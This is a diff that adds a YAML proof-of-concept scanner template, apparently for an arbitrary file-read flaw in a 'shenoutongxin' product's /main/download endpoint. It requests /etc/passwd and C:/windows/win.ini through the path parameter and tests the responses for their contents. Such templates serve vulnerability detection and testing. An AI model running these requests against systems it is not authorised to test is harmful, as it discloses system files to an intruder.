@@ -1,0 +1,23 @@
+name: poc-yaml-shenoutongxin-download-File-reading
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /main/download?path=/etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+  r1:
+    request:
+      method: GET
+      path: /main/download?path=C:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'; for 16-bit app support')
+expression: r0() || r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139783198
+
+
